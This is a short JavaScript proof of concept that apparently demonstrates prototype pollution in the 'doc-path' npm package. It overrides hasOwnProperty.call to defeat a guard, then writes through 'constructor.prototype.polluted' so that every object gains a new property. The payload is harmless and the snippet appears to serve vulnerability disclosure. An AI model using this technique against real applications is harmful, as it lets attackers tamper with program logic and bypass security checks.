Object.prototype.hasOwnProperty.call = () => true;
const path = require('doc-path');
let obj = {};
console.log({}.polluted);
path.setPath({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);